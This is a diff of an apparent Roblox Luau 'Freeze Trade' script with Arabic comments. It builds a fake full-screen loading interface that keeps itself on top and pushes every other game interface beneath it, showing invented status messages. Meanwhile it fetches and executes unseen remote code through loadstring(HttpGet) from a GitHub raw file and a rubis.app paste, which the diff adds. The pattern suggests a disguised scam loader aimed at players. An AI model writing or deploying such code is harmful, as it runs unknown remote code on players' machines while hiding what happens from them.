@@ -1,4 +1,4 @@
--- السكربت الأول (واجهة Freeze Trade المثبتة بالقوة في الأعلى)
+-- 1. تشغيل واجهة التحميل الخاصة بك (السكربت الثاني)
 task.spawn(function()
     local Players = game:GetService("Players")
     local TweenService = game:GetService("TweenService")
@@ -9,7 +9,7 @@ task.spawn(function()
     screenGui.Name = "FreezeTradeGui"
     screenGui.ResetOnSpawn = false
     screenGui.IgnoreGuiInset = true
-    screenGui.DisplayOrder = 2147483647 -- أقصى رقم ممكن في لغة Luau لترتيب الطبقات
+    screenGui.DisplayOrder = 2147483647
     
     if gethui then
         screenGui.Parent = gethui()
@@ -17,18 +17,18 @@ task.spawn(function()
         screenGui.Parent = player:WaitForChild("PlayerGui")
     end
 
-    -- إجبار الواجهة على البقاء في الأعلى دائماً حتى لو تم تشغيل سكربت آخر بعدها
+    -- Force UI to stay on top
     task.spawn(function()
-        while task.wait(0.5) do
+        while screenGui and screenGui.Parent do
+            task.wait(0.5)
             screenGui.DisplayOrder = 2147483647
             
-            -- خيار إضافي: خفض ترتيب أي ScreenGui أخرى يتم إنشاؤها في اللعبة
             local parentObj = screenGui.Parent
             if parentObj then
                 for _, gui in ipairs(parentObj:GetChildren()) do
                     if gui:IsA("ScreenGui") and gui ~= screenGui then
                         if gui.DisplayOrder >= screenGui.DisplayOrder then
-                            gui.DisplayOrder = 1000 -- خفض ترتيب السكربتات الأخرى لتكون تحت واجهتك
+                            gui.DisplayOrder = 1000
                         end
                     end
                 end
@@ -150,35 +150,6 @@ task.spawn(function()
     tipLabel.Font = Enum.Font.SourceSans
     tipLabel.Parent = mainFrame
 
-    -- Outdated Screen Container
-    local messageContainer = Instance.new("Frame")
-    messageContainer.Size = UDim2.new(0.85, 0, 0.4, 0)
-    messageContainer.AnchorPoint = Vector2.new(0.5, 0.5)
-    messageContainer.Position = UDim2.new(0.5, 0, 0.50, 0)
-    messageContainer.BackgroundTransparency = 1
-    messageContainer.Visible = false
-    messageContainer.Parent = mainFrame
-
-    local errorTitle = Instance.new("TextLabel")
-    errorTitle.Size = UDim2.new(1, 0, 0.25, 0)
-    errorTitle.Position = UDim2.new(0, 0, 0.05, 0)
-    errorTitle.BackgroundTransparency = 1
-    errorTitle.Text = "SCRIPT OUTDATED"
-    errorTitle.TextColor3 = Color3.fromRGB(255, 60, 60)
-    errorTitle.TextScaled = true
-    errorTitle.Font = Enum.Font.SourceSansBold
-    errorTitle.Parent = messageContainer
-
-    local errorDesc = Instance.new("TextLabel")
-    errorDesc.Size = UDim2.new(1, 0, 0.65, 0)
-    errorDesc.Position = UDim2.new(0, 0, 0.32, 0)
-    errorDesc.BackgroundTransparency = 1
-    errorDesc.Text = "You are currently running an outdated version of Freeze Trade.\n\nInstalled Version: v2.08.411\nLatest Version: v5.12.094\n\nPlease update your script from the official source to continue."
-    errorDesc.TextColor3 = Color3.fromRGB(230, 230, 230)
-    errorDesc.TextScaled = true
-    errorDesc.Font = Enum.Font.SourceSans
-    errorDesc.Parent = messageContainer
-
     -- TikTok Label
     local tiktokContainer = Instance.new("Frame")
     tiktokContainer.Size = UDim2.new(0.85, 0, 0.06, 0)
@@ -207,10 +178,12 @@ task.spawn(function()
         "⚙️ Status: Finalizing server connection..."
     }
 
+    local tipConnection = true
     task.spawn(function()
         local index = 1
-        while true do
+        while tipConnection do
             task.wait(12)
+            if not tipConnection then break end
             index = (index % #tips) + 1
             tipLabel.Text = tips[index]
         end
@@ -226,9 +199,14 @@ task.spawn(function()
     }
 
     task.spawn(function()
-        for _, s in ipairs(statuses) do
-            task.wait(s.time == 0 and 0 or (s.time - (statuses[_ - 1] and statuses[_ - 1].time or 0)))
-            statusLabel.Text = s.text
+        for i, s in ipairs(statuses) do
+            local prevTime = (i > 1 and statuses[i - 1].time) or 0
+            task.wait(s.time == 0 and 0 or (s.time - prevTime))
+            if statusLabel and statusLabel.Parent then
+                statusLabel.Text = s.text
+            else
+                break
+            end
         end
     end)
 
@@ -250,14 +228,11 @@ task.spawn(function()
             
             if progress >= 1 then
                 percentLabel.Text = "100%"
-                barBackground.Visible = false
-                percentLabel.Visible = false
-                avatarImage.Visible = false
-                nameLabel.Visible = false
-                statusLabel.Visible = false
-                tipLabel.Visible = false
+                tipConnection = false
                 
-                messageContainer.Visible = true
+                -- إيقاف التوين وحذف الواجهة بالكامل لتختفي تماماً
+                tween:Cancel()
+                screenGui:Destroy()
                 break
             end
             task.wait(0.1)
@@ -265,8 +240,16 @@ task.spawn(function()
     end)
 end)
 
--- تأخير بسيط قبل تشغيل Project Sync للتأكد من اكتمال إنشاء الواجهة الرئيسية أولاً
+-- 2. تشغيل السكربت الأول (mm)
 task.spawn(function()
-    task.wait(1)
-    loadstring(game:HttpGet("https://syncapp.work/run/JhPParJ3IMYQDpdReE3FKHTfCn7gh934rdlFa0ck4h07BoQisiZrn0JInEsjDZNBNMpcaKPTl-Po"))()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/script-mini/Freeze-Trade-/refs/heads/main/mm"))()
+    end)
+end)
+
+-- 3. تشغيل السكربت الثالث (الرابط الجديد)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ATg8B9rZdemrVDly/raw", true))()
+    end)
 end)
